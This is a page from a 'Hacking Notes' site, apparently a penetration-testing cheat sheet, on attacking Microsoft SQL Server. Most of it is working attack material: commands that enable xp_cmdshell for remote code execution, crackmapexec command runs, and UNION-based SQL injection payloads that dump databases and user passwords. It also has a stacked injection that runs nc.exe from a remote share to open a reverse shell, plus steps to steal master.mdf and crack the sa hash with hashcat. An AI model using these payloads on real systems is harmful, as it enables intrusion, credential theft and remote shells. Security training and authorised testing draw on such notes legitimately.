<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>PORT 1433/tcp - Microsoft SQL Server | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="PORT 1433/tcp - Microsoft SQL Server" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Introduction" />
<meta property="og:description" content="Introduction" />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/services/sql-server/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/services/sql-server/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"Introduction","url":"http://0.0.0.0:4000/hackingnotes/services/sql-server/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"PORT 1433/tcp - Microsoft SQL Server","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/lateral-movement/">Lateral Movement</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-persistence/">Domain Persistence</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-privesc/">Domain Privilege Escalation</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item current"><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Services</h2>
				<h3>PORT 1433/tcp - Microsoft SQL Server</h3>
			</div>
			<article class="content">
				<h1 id="introduction">Introduction</h1>

<p>Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network.</p>

<h1 id="rce-with-credentials">RCE With Credentials</h1>

<h2 id="sqsh">sqsh</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqsh -S &lt;IP-ADDR&gt; -U &lt;user&gt; -P &lt;pass&gt; -D &lt;database&gt;
</code></pre></div></div>

<p>In MSSQL there is a procedure called <strong>xp_cmdshell</strong> that receives a command from Windows, executes it and return the result as rows of text. Although the most common case is that the user of the application does not have permissions to execute the <strong>xp_cmdshell</strong> procedure because is disabled by default, it has been seen on several occasions that, due to a misconfiguration, it does have permissions to enable it.</p>

<p>We need to configure <code class="highlighter-rouge">xp_cmdshell</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; EXEC SP_CONFIGURE N'show advanced options', 1
2&gt; go
Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1&gt; EXEC SP_CONFIGURE N'xp_cmdshell', 1
2&gt; go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1&gt; RECONFIGURE
2&gt; go
</code></pre></div></div>

<p>Once configured we can execute commands with <code class="highlighter-rouge">sqsh</code> or <code class="highlighter-rouge">crackmapexec</code>.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1&gt; xp_cmdshell 'dir c:\';
2&gt; go
</code></pre></div></div>

<h2 id="crackmapexec">crackmapexec</h2>

<p>We can execute code in a easier way with crackmapexec.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec mssql -u sa -p password --local-auth -x 'whoami'
</code></pre></div></div>

<h1 id="sql-injection-in-mssql">SQL Injection in MSSQL</h1>

<p>To understand the vulnerability visit the following page link.</p>

<ul>
  <li><a href="/hackingnotes/web/sqli/">SQL Injection</a></li>
</ul>

<p>Some SQLi payloads are the following (supposing that the original query return two values):</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' union all select 1,2 -- -

# Current User
' union all select CURRENT_USER, 2 -- -

# Databases
' union all select name, 2 from master..sysdatabases -- -

# Tables from database "music"
' union all select name, 2 from music..sysobjects  WHERE xtype = 'U' -- -

# Columns from "users" table
' union all select name, 2 from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') -- -

# Dump a table
' union all select user, password from users -- -
</code></pre></div></div>

<p>We can also append commands on the query and execute commands with the procedure <strong>xp_cmdshell.</strong></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; -- -
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -
'; EXEC xp_cmdshell '\\10.10.10.10\share\nc.exe -e cmd.exe 10.10.10.10 443' -- - 
</code></pre></div></div>

<h1 id="lfi-or-file-download-to-rce">LFI or File Download to RCE</h1>

<p>If we are able to download any file of the system and has the MSSQL port open, we can retrieved the <strong>sa</strong> hash.</p>

<p>We need to download a copy of the master.mdf file located on:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:/Program Files/Microsoft SQL Server/MSSQL14.SQLEXPRESS/MSSQL/DATA/master.mdf
or
C:/Program Files/Microsoft SQL Server/MSSQL14.SQLSERVER/MSSQL/DATA/master.mdf
</code></pre></div></div>

<p>Since the file is running we can not read it, so we need to find a backup. Some backups are available here:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:/Program Files/Microsoft SQL Server/MSSQL14.SQLEXPRESS/MSSQL/Backup/master.mdf
</code></pre></div></div>

<p>Once downloaded we can dump the hashes with <a href="https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes">XPN script.</a></p>

<ul>
  <li><a href="https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes">https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes</a></li>
</ul>

<blockquote>
  <p><strong>Note:</strong> The code fails while trying to load OrcaMDF dlls, see the following pull request to fix it.</p>

  <p><a href="https://github.com/xpn/Powershell-PostExploitation/pull/2">https://github.com/xpn/Powershell-PostExploitation/pull/2</a></p>
</blockquote>

<p><em>File changed:</em></p>

<p><img src="/hackingnotes/images/file_changed.png" alt="Tothi pull request." /></p>

<p>We just need to import the module and extract the hashes.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module Get-MDFHashes.psq
Get-MDFHashes -mdf master.mdf
</code></pre></div></div>

<p><img src="/hackingnotes/images/mdf_hashes.png" alt="Dumping mdf hashes" /></p>

<p>We can crack it with Hashcat (mode 1731).</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -a 0 -m 1731 hash.txt /usr/share/wordlists/rockyou.txt
</code></pre></div></div>

<p>Once obtained the credentials we can execute code with <code class="highlighter-rouge">crackmapexec</code> or <code class="highlighter-rouge">sqsh</code>.</p>

<ul>
  <li><a href="https://blog.xpnsec.com/extracting-master-mdf-hashes/">https://blog.xpnsec.com/extracting-master-mdf-hashes/</a></li>
</ul>

<h1 id="references"><strong>References</strong></h1>

<ul>
  <li><a href="https://www.tarlogic.com/blog/red-team-tales-0x01/#:\~:text=In%20MSSQL%2C%20there%20is%20a,occurs%20in%20the%20original%20query.">https://www.tarlogic.com/blog/red-team-tales-0x01/#:~:text=In%20MSSQL%2C%20there%20is%20a,occurs%20in%20the%20original%20query.</a></li>
  <li><a href="https://dotcppfile.wordpress.com/2014/07/24/reading-files-in-mssql-injection-tutorial/">https://dotcppfile.wordpress.com/2014/07/24/reading-files-in-mssql-injection-tutorial/</a></li>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md</a></li>
  <li><a href="https://blog.xpnsec.com/extracting-master-mdf-hashes/">https://blog.xpnsec.com/extracting-master-mdf-hashes/</a></li>
</ul>

			</article>
		</section>

		<script>
			document.getElementById("open-nav").addEventListener("click", function () {
				document.body.classList.toggle("nav-open");
			});
		</script>
	</body>
</html>
